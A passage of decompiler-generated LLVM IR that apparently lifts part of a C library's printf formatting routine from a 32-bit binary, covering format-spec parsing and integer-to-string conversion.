  %v1_8051d5e = phi i32 [ %v1_8051d5620, %dec_label_pc_8051d4c.backedge ], [ %v0_8051d44, %dec_label_pc_8051d2d ]
  %v0_8051d5a = phi i32 [ %v0_8051d4c18, %dec_label_pc_8051d4c.backedge ], [ %v0_8051d44, %dec_label_pc_8051d2d ]
  %v4_8051d4c = phi i32 [ %v4_8051d4c.pre, %dec_label_pc_8051d4c.backedge ], [ %v6_8051d37, %dec_label_pc_8051d2d ]
  %v1_8051d4c = inttoptr i32 %v0_8051d5a to i8*
  %v2_8051d4c = load i8, i8* %v1_8051d4c, align 1
  %v3_8051d4c = zext i8 %v2_8051d4c to i32
  %v5_8051d4c = and i32 %v4_8051d4c, -256
  %v6_8051d4c = or i32 %v3_8051d4c, %v5_8051d4c
  store i32 %v6_8051d4c, i32* %eax.global-to-local, align 4
  %v4_8051d4e = icmp eq i8 %v2_8051d4c, 0
  br i1 %v4_8051d4e, label %dec_label_pc_8051d56, label %dec_label_pc_8051d52

dec_label_pc_8051d52:                             ; preds = %dec_label_pc_8051d4c
  %v10_8051d52 = icmp eq i8 %v2_8051d4c, 37
  %v1_8051d54 = icmp eq i1 %v10_8051d52, false
  br i1 %v1_8051d54, label %dec_label_pc_8051d4b, label %dec_label_pc_8051d56

dec_label_pc_8051d56:                             ; preds = %dec_label_pc_8051d52, %dec_label_pc_8051d4c
  %v2_8051d56 = sub i32 %v0_8051d5a, %v1_8051d5e
  %v12_8051d56 = icmp eq i32 %v2_8051d56, 0
  br i1 %v12_8051d56, label %dec_label_pc_8051d81, label %dec_label_pc_8051d5a

dec_label_pc_8051d5a:                             ; preds = %dec_label_pc_8051d56
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8051d56, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_8051d56, 1
  br i1 %tmp67, label %dec_label_pc_8051d76, label %dec_label_pc_8051d64

dec_label_pc_8051d64:                             ; preds = %dec_label_pc_8051d5a
  %v0_8051d64 = load i32, i32* @ebp, align 4
  %v1_8051d64 = load i32, i32* @esp, align 4
  %v2_8051d64 = add i32 %v1_8051d64, -4
  %v3_8051d64 = inttoptr i32 %v2_8051d64 to i32*
  store i32 %v0_8051d64, i32* %v3_8051d64, align 4
  %v1_8051d65 = add i32 %v1_8051d64, 368
  %v2_8051d65 = inttoptr i32 %v1_8051d65 to i32*
  %v3_8051d65 = load i32, i32* %v2_8051d65, align 4
  %v5_8051d65 = add i32 %v1_8051d64, -8
  %v6_8051d65 = inttoptr i32 %v5_8051d65 to i32*
  store i32 %v3_8051d65, i32* %v6_8051d65, align 4
  %v0_8051d6c = load i32, i32* @esi, align 4
  %v2_8051d6c = add i32 %v1_8051d64, -12
  %v3_8051d6c = inttoptr i32 %v2_8051d6c to i32*
  store i32 %v0_8051d6c, i32* %v3_8051d6c, align 4
  %v0_8051d6d = load i32, i32* %edx.global-to-local, align 4
  %v2_8051d6d = add i32 %v1_8051d64, -16
  %v3_8051d6d = inttoptr i32 %v2_8051d6d to i32*
  store i32 %v0_8051d6d, i32* %v3_8051d6d, align 4
  %v0_8051d6e = load i32, i32* %stack_var_-364, align 4
  %v4_8051d6e = call i32 @__stdio_fwrite(i32 %v0_8051d6e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051d6e, i32* %eax.global-to-local, align 4
  %v1_8051d76.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051d76

dec_label_pc_8051d76:                             ; preds = %dec_label_pc_8051d5a, %dec_label_pc_8051d64
  %v3_8051d7e = phi i32 [ %v2_8051d56, %dec_label_pc_8051d5a ], [ %v1_8051d76.pre, %dec_label_pc_8051d64 ]
  %v0_8051d76 = phi i32 [ 0, %dec_label_pc_8051d5a ], [ %v4_8051d6e, %dec_label_pc_8051d64 ]
  %v12_8051d76 = icmp eq i32 %v0_8051d76, %v3_8051d7e
  %v1_8051d78 = icmp eq i1 %v12_8051d76, false
  %v0_805225f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8051d78, label %dec_label_pc_805225f, label %dec_label_pc_8051d7e

dec_label_pc_8051d7e:                             ; preds = %dec_label_pc_8051d76
  %v1_8051d7e = inttoptr i32 %v0_805225f.pre.pre to i32*
  %v2_8051d7e = load i32, i32* %v1_8051d7e, align 4
  %v4_8051d7e = add i32 %v2_8051d7e, %v3_8051d7e
  store i32 %v4_8051d7e, i32* %v1_8051d7e, align 4
  %v0_8051d81.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d81

dec_label_pc_8051d81:                             ; preds = %dec_label_pc_8051d56, %dec_label_pc_8051d7e
  %v0_8052257 = phi i32 [ %v0_8051d5a, %dec_label_pc_8051d56 ], [ %v0_8051d81.pre, %dec_label_pc_8051d7e ]
  %v1_8051d81 = inttoptr i32 %v0_8052257 to i8*
  %v2_8051d81 = load i8, i8* %v1_8051d81, align 1
  %v3_8051d81 = icmp eq i8 %v2_8051d81, 0
  br i1 %v3_8051d81, label %dec_label_pc_8052266, label %dec_label_pc_8051d8a

dec_label_pc_8051d8a:                             ; preds = %dec_label_pc_8051d81
  %v1_8051d8a = add i32 %v0_8052257, 1
  store i32 %v1_8051d8a, i32* %edx.global-to-local, align 4
  %v2_8051d8d = inttoptr i32 %v1_8051d8a to i8*
  %v3_8051d8d = load i8, i8* %v2_8051d8d, align 1
  %v12_8051d8d = icmp eq i8 %v3_8051d8d, 37
  br i1 %v12_8051d8d, label %dec_label_pc_8052257, label %dec_label_pc_8051d97

dec_label_pc_8051d97:                             ; preds = %dec_label_pc_8051d8a
  %v1_8051d97 = load i32, i32* @esp, align 4
  %v2_8051d97 = add i32 %v1_8051d97, 16
  %v3_8051d97 = inttoptr i32 %v2_8051d97 to i32*
  store i32 %v1_8051d8a, i32* %v3_8051d97, align 4
  %v0_8051d9b = load i32, i32* @esp, align 4
  %v1_8051d9b = add i32 %v0_8051d9b, 340
  %v2_8051d9b = inttoptr i32 %v1_8051d9b to i32*
  store i32 0, i32* %v2_8051d9b, align 4
  %v0_8051da6 = load i32, i32* @esp, align 4
  %v1_8051da9 = add i32 %v0_8051da6, 16
  store i32 %v1_8051da9, i32* @ebx, align 4
  %v2_8051dad = add i32 %v0_8051da6, -16
  %v3_8051dad = inttoptr i32 %v2_8051dad to i32*
  store i32 %v1_8051da9, i32* %v3_8051dad, align 4
  %v0_8051dae = load i32, i32* %stack_var_-364, align 4
  %v1_8051dae = inttoptr i32 %v0_8051dae to i32*
  %v2_8051dae = call i32 @_ppfs_parsespec(i32* %v1_8051dae)
  store i32 %v2_8051dae, i32* %eax.global-to-local, align 4
  %v0_8051db3 = load i32, i32* @ebx, align 4
  %v1_8051db3 = load i32, i32* @esp, align 4
  %v2_8051db3 = inttoptr i32 %v1_8051db3 to i32*
  store i32 %v0_8051db3, i32* %v2_8051db3, align 4
  %v0_8051db6 = load i32, i32* %stack_var_-364, align 4
  %v1_8051db6 = call i32 @_ppfs_setargs(i32 %v0_8051db6)
  store i32 %v1_8051db6, i32* %eax.global-to-local, align 4
  %v0_8051dbb = load i32, i32* @esp, align 4
  %v1_8051dbb = add i32 %v0_8051dbb, 70
  %v2_8051dbb = inttoptr i32 %v1_8051dbb to i8*
  %v3_8051dbb = load i8, i8* %v2_8051dbb, align 1
  %v4_8051dbb = zext i8 %v3_8051dbb to i32
  store i32 %v4_8051dbb, i32* @edi, align 4
  %v1_8051dc0 = add i32 %v0_8051dbb, 16
  %v1_8051dc3 = add i32 %v0_8051dbb, 56
  %v2_8051dc3 = inttoptr i32 %v1_8051dc3 to i32*
  %v3_8051dc3 = load i32, i32* %v2_8051dc3, align 4
  %v1_8051dc8 = add i32 %v0_8051dbb, 112
  store i32 %v1_8051dc8, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_8051dc3, 1
  br i1 %tmp68, label %dec_label_pc_8051dd5, label %dec_label_pc_8051dce

dec_label_pc_8051dce:                             ; preds = %dec_label_pc_8051d97
  %v2_8051dce = zext i8 %v3_8051dbb to i32
  %v3_8051dce = mul nuw nsw i32 %v2_8051dce, 12
  store i32 %v3_8051dce, i32* %eax.global-to-local, align 4
  %v2_8051dd1 = add i32 %v0_8051dbb, 100
  %v3_8051dd1 = add i32 %v2_8051dd1, %v3_8051dce
  store i32 %v3_8051dd1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051dd5

dec_label_pc_8051dd5:                             ; preds = %dec_label_pc_8051d97, %dec_label_pc_8051dce
  %v0_8051ddd28 = phi i32 [ %v1_8051dc8, %dec_label_pc_8051d97 ], [ %v3_8051dd1, %dec_label_pc_8051dce ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051dd7 = add i32 %v0_8051dbb, 60
  %v2_8051dd7 = inttoptr i32 %v1_8051dd7 to i32*
  %v3_8051dd7 = load i32, i32* %v2_8051dd7, align 4
  store i32 %v3_8051dd7, i32* %ecx.global-to-local, align 4
  %v2_8051de881 = sub i32 0, %v3_8051dd7
  %v10_8051de884 = and i32 %v3_8051dd7, %v2_8051de881
  %v11_8051de885 = icmp slt i32 %v10_8051de884, 0
  %v13_8051de886 = icmp slt i32 %v2_8051de881, 0
  %v2_8051dea87 = icmp eq i1 %v13_8051de886, %v11_8051de885
  br i1 %v2_8051dea87, label %dec_label_pc_8051dec, label %dec_label_pc_8051ddd

dec_label_pc_8051ddd:                             ; preds = %dec_label_pc_8051dd5, %dec_label_pc_8051ddd
  %v0_8051dec91 = phi i32 [ %v0_8051dec, %dec_label_pc_8051ddd ], [ %v1_8051dc0, %dec_label_pc_8051dd5 ]
  %v2_8051ddd90 = phi i32 [ %v1_8051de7, %dec_label_pc_8051ddd ], [ 0, %dec_label_pc_8051dd5 ]
  %v0_8051ddd89 = phi i32 [ %v1_8051de4, %dec_label_pc_8051ddd ], [ %v0_8051ddd28, %dec_label_pc_8051dd5 ]
  %v3_8051ddd = mul i32 %v2_8051ddd90, 4
  %v4_8051ddd = add i32 %v0_8051dec91, 344
  %v5_8051ddd = add i32 %v4_8051ddd, %v3_8051ddd
  %v6_8051ddd = inttoptr i32 %v5_8051ddd to i32*
  store i32 %v0_8051ddd89, i32* %v6_8051ddd, align 4
  %v0_8051de4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051de4 = add i32 %v0_8051de4, 12
  store i32 %v1_8051de4, i32* %edx.global-to-local, align 4
  %v0_8051de7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051de7 = add i32 %v0_8051de7, 1
  store i32 %v1_8051de7, i32* %eax.global-to-local, align 4
  %v1_8051de8.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051de8 = sub i32 %v1_8051de7, %v1_8051de8.pre
  %v8_8051de8 = xor i32 %v1_8051de7, %v1_8051de8.pre
  %v9_8051de8 = xor i32 %v2_8051de8, %v1_8051de7
  %v10_8051de8 = and i32 %v9_8051de8, %v8_8051de8
  %v11_8051de8 = icmp slt i32 %v10_8051de8, 0
  %v13_8051de8 = icmp slt i32 %v2_8051de8, 0
  %v2_8051dea = icmp eq i1 %v13_8051de8, %v11_8051de8
  %v0_8051dec = load i32, i32* @esp, align 4
  br i1 %v2_8051dea, label %dec_label_pc_8051dec, label %dec_label_pc_8051ddd

dec_label_pc_8051dec:                             ; preds = %dec_label_pc_8051ddd, %dec_label_pc_8051dd5
  %v0_8051dec.lcssa = phi i32 [ %v1_8051dc0, %dec_label_pc_8051dd5 ], [ %v0_8051dec, %dec_label_pc_8051ddd ]
  %v1_8051dec = add i32 %v0_8051dec.lcssa, 48
  %v2_8051dec = inttoptr i32 %v1_8051dec to i32*
  %v3_8051dec = load i32, i32* %v2_8051dec, align 4
  store i32 %v3_8051dec, i32* @ecx, align 4
  %v1_8051df0 = icmp eq i32 %v3_8051dec, 0
  %v1_8051df2 = icmp eq i1 %v1_8051df0, false
  br i1 %v1_8051df2, label %dec_label_pc_8051e1a, label %dec_label_pc_8051df4

dec_label_pc_8051df4:                             ; preds = %dec_label_pc_8051dec
  %v1_8051df4 = inttoptr i32 %v0_8051dec.lcssa to i32*
  %v2_8051df4 = load i32, i32* %v1_8051df4, align 4
  store i32 %v2_8051df4, i32* %eax.global-to-local, align 4
  %v1_8051df7 = ashr i32 %v2_8051df4, 31
  store i32 %v1_8051df7, i32* %edx.global-to-local, align 4
  %v2_8051df8 = add i32 %v0_8051dec.lcssa, -4
  %v3_8051df8 = inttoptr i32 %v2_8051df8 to i32*
  store i32 %v1_8051df7, i32* %v3_8051df8, align 4
  %v0_8051df9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051df9 = add i32 %v0_8051dec.lcssa, -8
  %v3_8051df9 = inttoptr i32 %v2_8051df9 to i32*
  store i32 %v0_8051df9, i32* %v3_8051df9, align 4
  %v1_8051dfa = add i32 %v0_8051dec.lcssa, 32
  %v2_8051dfa = inttoptr i32 %v1_8051dfa to i32*
  %v3_8051dfa = load i32, i32* %v2_8051dfa, align 4
  %v1_8051dfe = and i32 %v3_8051dfa, 3840
  store i32 %v1_8051dfe, i32* %eax.global-to-local, align 4
  %v2_8051e03 = add i32 %v0_8051dec.lcssa, -12
  %v3_8051e03 = inttoptr i32 %v2_8051e03 to i32*
  store i32 %v1_8051dfe, i32* %v3_8051e03, align 4
  %v1_8051e04 = add i32 %v0_8051dec.lcssa, 344
  %v2_8051e04 = inttoptr i32 %v1_8051e04 to i32*
  %v3_8051e04 = load i32, i32* %v2_8051e04, align 4
  store i32 %v3_8051e04, i32* %eax.global-to-local, align 4
  %v1_8051e0b = inttoptr i32 %v3_8051e04 to i32*
  %v2_8051e0b = load i32, i32* %v1_8051e0b, align 4
  %v4_8051e0b = add i32 %v0_8051dec.lcssa, -16
  %v5_8051e0b = inttoptr i32 %v4_8051e0b to i32*
  store i32 %v2_8051e0b, i32* %v5_8051e0b, align 4
  %v0_8051e0d = call i32 @_store_inttype()
  store i32 %v0_8051e0d, i32* %eax.global-to-local, align 4
  %v0_8051e12 = load i32, i32* @esp, align 4
  %v1_8051e12 = add i32 %v0_8051e12, 16
  br label %dec_label_pc_805224c

dec_label_pc_8051e1a:                             ; preds = %dec_label_pc_8051dec
  %tmp94 = icmp ult i32 %v3_8051dec, 8
  br i1 %tmp94, label %dec_label_pc_8051e23, label %dec_label_pc_8051f84

dec_label_pc_8051e23:                             ; preds = %dec_label_pc_8051e1a
  %v1_8051e23 = add i32 %v3_8051dec, 134591952
  %v2_8051e23 = inttoptr i32 %v1_8051e23 to i8*
  %v3_8051e23 = load i8, i8* %v2_8051e23, align 1
  %v4_8051e23 = sext i8 %v3_8051e23 to i32
  store i32 %v4_8051e23, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8051e2f = icmp eq i8 %v3_8051e23, 10
  %v1_8051e32 = icmp eq i1 %v9_8051e2f, false
  br i1 %v1_8051e32, label %dec_label_pc_8051e50, label %dec_label_pc_8051e34

dec_label_pc_8051e34:                             ; preds = %dec_label_pc_8051e23
  %v1_8051e34 = add i32 %v0_8051dec.lcssa, 32
  %v2_8051e34 = inttoptr i32 %v1_8051e34 to i32*
  %v3_8051e34 = load i32, i32* %v2_8051e34, align 4
  %v1_8051e3a = and i32 %v3_8051e34, 32
  store i32 %v1_8051e3a, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_8051e3a, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_8051e48 = trunc i32 %v3_8051e34 to i8
  %v2_8051e48 = and i8 %v1_8051e48, 64
  %v3_8051e48 = icmp eq i8 %v2_8051e48, 0
  %v5_8051e48 = zext i8 %v2_8051e48 to i32
  %v7_8051e48 = and i32 %v3_8051e34, -256
  %v8_8051e48 = or i32 %v5_8051e48, %v7_8051e48
  store i32 %v8_8051e48, i32* %edx.global-to-local, align 4
  br i1 %v3_8051e48, label %dec_label_pc_8051e50, label %dec_label_pc_8051e4d

dec_label_pc_8051e4d:                             ; preds = %dec_label_pc_8051e34
  %v2_8051e4d = or i32 %tmp70, 128
  store i32 %v2_8051e4d, i32* @ebx, align 4
  br label %dec_label_pc_8051e50

dec_label_pc_8051e50:                             ; preds = %dec_label_pc_8051e34, %dec_label_pc_8051e23, %dec_label_pc_8051e4d
  %tmp95 = icmp ult i32 %v3_8051dec, 6
  br i1 %tmp95, label %dec_label_pc_8051e55, label %dec_label_pc_8051e6d

dec_label_pc_8051e55:                             ; preds = %dec_label_pc_8051e50
  %v9_8051e55 = icmp eq i32 %v3_8051dec, 3
  %v1_8051e58 = icmp eq i1 %v9_8051e55, false
  br i1 %v1_8051e58, label %dec_label_pc_8051e61, label %dec_label_pc_8051e5a

dec_label_pc_8051e5a:                             ; preds = %dec_label_pc_8051e55
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8051e6f

dec_label_pc_8051e61:                             ; preds = %dec_label_pc_8051e55
  %v9_8051e66 = icmp eq i32 %v3_8051dec, 1
  br i1 %v9_8051e66, label %dec_label_pc_8051e74, label %dec_label_pc_8051e6f

dec_label_pc_8051e6d:                             ; preds = %dec_label_pc_8051e50
  %v1_8051e6d = sub nsw i32 0, %v4_8051e23
  store i32 %v1_8051e6d, i32* @esi, align 4
  br label %dec_label_pc_8051e6f

dec_label_pc_8051e6f:                             ; preds = %dec_label_pc_8051e61, %dec_label_pc_8051e5a, %dec_label_pc_8051e6d
  br label %dec_label_pc_8051e74

dec_label_pc_8051e74:                             ; preds = %dec_label_pc_8051e61, %dec_label_pc_8051e6f
  %storemerge106 = phi i32 [ 11, %dec_label_pc_8051e6f ], [ 6, %dec_label_pc_8051e61 ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_8051e74 = add i32 %v0_8051dec.lcssa, 7
  %v2_8051e74 = inttoptr i32 %v1_8051e74 to i8*
  store i8 32, i8* %v2_8051e74, align 1
  %v0_8051e79 = load i32, i32* @esp, align 4
  %v1_8051e79 = add i32 %v0_8051e79, 20
  %v2_8051e79 = inttoptr i32 %v1_8051e79 to i32*
  %v3_8051e79 = load i32, i32* %v2_8051e79, align 4
  %v5_8051e79 = icmp slt i32 %v3_8051e79, 0
  %v1_8051e7e = icmp eq i1 %v5_8051e79, false
  br i1 %v1_8051e7e, label %dec_label_pc_8051e88, label %dec_label_pc_8051e80

dec_label_pc_8051e80:                             ; preds = %dec_label_pc_8051e74
  %v1_8051e80 = add i32 %v0_8051e79, 36
  %v2_8051e80 = inttoptr i32 %v1_8051e80 to i8*
  %v3_8051e80 = load i8, i8* %v2_8051e80, align 1
  %v4_8051e80 = zext i8 %v3_8051e80 to i32
  %v5_8051e80 = load i32, i32* %edx.global-to-local, align 4
  %v6_8051e80 = and i32 %v5_8051e80, -256
  %v7_8051e80 = or i32 %v6_8051e80, %v4_8051e80
  store i32 %v7_8051e80, i32* %edx.global-to-local, align 4
  %v3_8051e84 = add i32 %v0_8051e79, 7
  %v4_8051e84 = inttoptr i32 %v3_8051e84 to i8*
  store i8 %v3_8051e80, i8* %v4_8051e84, align 1
  %v0_8051e88.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051e88

dec_label_pc_8051e88:                             ; preds = %dec_label_pc_8051e74, %dec_label_pc_8051e80
  %v1_8051ea1 = phi i32 [ %v0_8051e79, %dec_label_pc_8051e74 ], [ %v0_8051e88.pre, %dec_label_pc_8051e80 ]
  %v1_8051e88 = add i32 %v1_8051ea1, 344
  %v2_8051e88 = inttoptr i32 %v1_8051e88 to i32*
  %v3_8051e88 = load i32, i32* %v2_8051e88, align 4
  store i32 %v3_8051e88, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_8051e94 = add i32 %v3_8051dec, -1
  %v8_8051e94 = icmp eq i32 %v1_8051e94, 0
  store i32 %v1_8051e94, i32* %ecx.global-to-local, align 4
  %v0_8051ea1.pre = load i32, i32* @edi, align 4
  br i1 %v8_8051e94, label %dec_label_pc_8051ea1, label %dec_label_pc_8051e97

dec_label_pc_8051e97:                             ; preds = %dec_label_pc_8051e88
  %v2_8051e97 = mul i32 %v0_8051ea1.pre, 4
  %v3_8051e97 = add i32 %v1_8051ea1, 52
  %v4_8051e97 = add i32 %v3_8051e97, %v2_8051e97
  %v5_8051e97 = inttoptr i32 %v4_8051e97 to i32*
  %v6_8051e97 = load i32, i32* %v5_8051e97, align 4
  %v1_8051e9b = and i32 %v6_8051e97, 3840
  store i32 %v1_8051e9b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051ea1

dec_label_pc_8051ea1:                             ; preds = %dec_label_pc_8051e88, %dec_label_pc_8051e97
  %v2_8051ea1 = add i32 %v1_8051ea1, -4
  %v3_8051ea1 = inttoptr i32 %v2_8051ea1 to i32*
  store i32 %v0_8051ea1.pre, i32* %v3_8051ea1, align 4
  %v0_8051ea2 = load i32, i32* @esi, align 4
  %v2_8051ea2 = add i32 %v1_8051ea1, -8
  %v3_8051ea2 = inttoptr i32 %v2_8051ea2 to i32*
  store i32 %v0_8051ea2, i32* %v3_8051ea2, align 4
  %v0_8051ea3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051ea3 = add i32 %v1_8051ea1, -12
  %v3_8051ea3 = inttoptr i32 %v2_8051ea3 to i32*
  store i32 %v0_8051ea3, i32* %v3_8051ea3, align 4
  %v0_8051ea4 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051ea4 = add i32 %v1_8051ea1, -16
  %v3_8051ea4 = inttoptr i32 %v2_8051ea4 to i32*
  store i32 %v0_8051ea4, i32* %v3_8051ea4, align 4
  %v0_8051ea5 = call i32 @_load_inttype()
  %v0_8051eaa = load i32, i32* @ebx, align 4
  %v1_8051eaa = load i32, i32* @esp, align 4
  %v2_8051eaa = inttoptr i32 %v1_8051eaa to i32*
  store i32 %v0_8051eaa, i32* %v2_8051eaa, align 4
  %v0_8051ead = load i32, i32* @esi, align 4
  %v1_8051ead = load i32, i32* @esp, align 4
  %v2_8051ead = add i32 %v1_8051ead, -4
  %v3_8051ead = inttoptr i32 %v2_8051ead to i32*
  store i32 %v0_8051ead, i32* %v3_8051ead, align 4
  %v0_8051eae = load i32, i32* @edx, align 4
  %v2_8051eae = add i32 %v1_8051ead, -8
  %v3_8051eae = inttoptr i32 %v2_8051eae to i32*
  store i32 %v0_8051eae, i32* %v3_8051eae, align 4
  %v2_8051eaf = add i32 %v1_8051ead, -12
  %v3_8051eaf = inttoptr i32 %v2_8051eaf to i32*
  store i32 %v0_8051ea5, i32* %v3_8051eaf, align 4
  %v1_8051eb0 = add i32 %v1_8051ead, 347
  store i32 %v1_8051eb0, i32* %eax.global-to-local, align 4
  %v2_8051eb7 = add i32 %v1_8051ead, -16
  %v3_8051eb7 = inttoptr i32 %v2_8051eb7 to i32*
  store i32 %v1_8051eb0, i32* %v3_8051eb7, align 4
  %v0_8051eb8 = load i32, i32* %stack_var_-364, align 4
  %v5_8051eb8 = inttoptr i32 %v0_8051eb8 to i8*
  %v6_8051eb8 = call i32 @_uintmaxtostr(i8* %v5_8051eb8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8051eb8, i32* %eax.global-to-local, align 4
  %v0_8051ebd = load i32, i32* @esp, align 4
  %v1_8051ebd = add i32 %v0_8051ebd, 32
  store i32 %v6_8051eb8, i32* @edi, align 4
  %v1_8051ec2 = add i32 %v0_8051ebd, 80
  %v2_8051ec2 = inttoptr i32 %v1_8051ec2 to i32*
  %v3_8051ec2 = load i32, i32* %v2_8051ec2, align 4
  %tmp96 = icmp ult i32 %v3_8051ec2, 6
  br i1 %tmp96, label %dec_label_pc_8051ef0, label %dec_label_pc_8051ec9

dec_label_pc_8051ec9:                             ; preds = %dec_label_pc_8051ea1
  %v1_8051ec9 = inttoptr i32 %v6_8051eb8 to i8*
  %v2_8051ec9 = load i8, i8* %v1_8051ec9, align 1
  %v11_8051ec9 = icmp eq i8 %v2_8051ec9, 45
  %v1_8051ecc = icmp eq i1 %v11_8051ec9, false
  %v1_8051edb = add i32 %v0_8051ebd, 64
  %v2_8051edb = inttoptr i32 %v1_8051edb to i32*
  %v3_8051edb = load i32, i32* %v2_8051edb, align 4
  br i1 %v1_8051ecc, label %dec_label_pc_8051edb, label %dec_label_pc_8051ece

dec_label_pc_8051ece:                             ; preds = %dec_label_pc_8051ec9
  %v4_8051ece = or i32 %v3_8051edb, 2
  store i32 %v4_8051ece, i32* %v2_8051edb, align 4
  %v0_8051ed3 = load i32, i32* @edi, align 4
  %v1_8051ed3 = add i32 %v0_8051ed3, 1
  store i32 %v1_8051ed3, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8051ef0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051ef0

dec_label_pc_8051edb:                             ; preds = %dec_label_pc_8051ec9
  store i32 %v3_8051edb, i32* %eax.global-to-local, align 4
  %v2_8051edf = and i32 %v3_8051edb, 2
  %v3_8051edf = icmp eq i32 %v2_8051edf, 0
  br i1 %v3_8051edf, label %dec_label_pc_8051ee7, label %dec_label_pc_8051ee3

dec_label_pc_8051ee3:                             ; preds = %dec_label_pc_8051edb
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051ef0

dec_label_pc_8051ee7:                             ; preds = %dec_label_pc_8051edb
  %v2_8051ee7 = urem i32 %v3_8051edb, 2
  %v3_8051ee7 = icmp eq i32 %v2_8051ee7, 0
  br i1 %v3_8051ee7, label %dec_label_pc_8051ef0, label %dec_label_pc_8051eeb

dec_label_pc_8051eeb:                             ; preds = %dec_label_pc_8051ee7
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_8051ef0

dec_label_pc_8051ef0:                             ; preds = %dec_label_pc_8051ee7, %dec_label_pc_8051ea1, %dec_label_pc_8051ee3, %dec_label_pc_8051ece, %dec_label_pc_8051eeb
  %v0_8051f43 = phi i32 [ %v6_8051eb8, %dec_label_pc_8051ee7 ], [ %v6_8051eb8, %dec_label_pc_8051ea1 ], [ %v6_8051eb8, %dec_label_pc_8051ee3 ], [ %v1_8051ed3, %dec_label_pc_8051ece ], [ %v6_8051eb8, %dec_label_pc_8051eeb ]
  %v0_8051f52 = phi i32 [ %v1_8051ebd, %dec_label_pc_8051ee7 ], [ %v1_8051ebd, %dec_label_pc_8051ea1 ], [ %v1_8051ebd, %dec_label_pc_8051ee3 ], [ %v0_8051ef0.pre, %dec_label_pc_8051ece ], [ %v1_8051ebd, %dec_label_pc_8051eeb ]
  %v1_8051ef0 = add i32 %v0_8051f52, 204
  store i32 %v1_8051ef0, i32* %ecx.global-to-local, align 4
  %v1_8051ef7 = add i32 %v0_8051f52, 20
  %v2_8051ef7 = inttoptr i32 %v1_8051ef7 to i32*
  %v3_8051ef7 = load i32, i32* %v2_8051ef7, align 4
  store i32 %v3_8051ef7, i32* %edx.global-to-local, align 4
  %v2_8051efb = sub i32 %v1_8051ef0, %v0_8051f43
  store i32 %v2_8051efb, i32* %ecx.global-to-local, align 4
  %v2_8051efd = icmp slt i32 %v3_8051ef7, 0
  %v1_8051eff = add i32 %v2_8051efb, 127
  store i32 %v1_8051eff, i32* @esi, align 4
  %v1_8051f02 = icmp eq i1 %v2_8051efd, false
  br i1 %v1_8051f02, label %dec_label_pc_8051f09, label %dec_label_pc_8051f04

dec_label_pc_8051f04:                             ; preds = %dec_label_pc_8051ef0
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051f09

dec_label_pc_8051f09:                             ; preds = %dec_label_pc_8051ef0, %dec_label_pc_8051f04
  %v0_8051f2f = phi i32 [ %v3_8051ef7, %dec_label_pc_8051ef0 ], [ 1, %dec_label_pc_8051f04 ]
  %v1_8051f09 = add i32 %v0_8051f52, 32
  %v2_8051f09 = inttoptr i32 %v1_8051f09 to i8*
  %v3_8051f09 = load i8, i8* %v2_8051f09, align 1
  %v4_8051f09 = and i8 %v3_8051f09, 16
  %v5_8051f09 = icmp eq i8 %v4_8051f09, 0
  br i1 %v5_8051f09, label %dec_label_pc_8051f43, label %dec_label_pc_8051f10

dec_label_pc_8051f10:                             ; preds = %dec_label_pc_8051f09
  %v1_8051f10 = add i32 %v0_8051f52, 48
  %v2_8051f10 = inttoptr i32 %v1_8051f10 to i32*
  %v3_8051f10 = load i32, i32* %v2_8051f10, align 4
  store i32 %v3_8051f10, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_8051f10, 3
  br i1 %tmp97, label %dec_label_pc_8051f2a.thread, label %dec_label_pc_8051f1e

dec_label_pc_8051f2a.thread:                      ; preds = %dec_label_pc_8051f10
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_8051f43

dec_label_pc_8051f1e:                             ; preds = %dec_label_pc_8051f10
  %v9_8051f1e = icmp eq i32 %v3_8051f10, 3
  %v1_8051f21 = icmp eq i1 %v9_8051f1e, false
  br i1 %v1_8051f21, label %dec_label_pc_8051f2a, label %dec_label_pc_8051f23

dec_label_pc_8051f23:                             ; preds = %dec_label_pc_8051f1e
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8051f43

dec_label_pc_8051f2a:                             ; preds = %dec_label_pc_8051f1e
  %v9_8051f2a = icmp eq i32 %v3_8051f10, 4
  %v1_8051f2d = icmp eq i1 %v9_8051f2a, false
  br i1 %v1_8051f2d, label %dec_label_pc_8051f43, label %dec_label_pc_8051f2f

dec_label_pc_8051f2f:                             ; preds = %dec_label_pc_8051f2a
  %tmp98 = icmp ugt i32 %v0_8051f2f, %v1_8051eff
  br i1 %tmp98, label %dec_label_pc_8051f43, label %dec_label_pc_8051f33

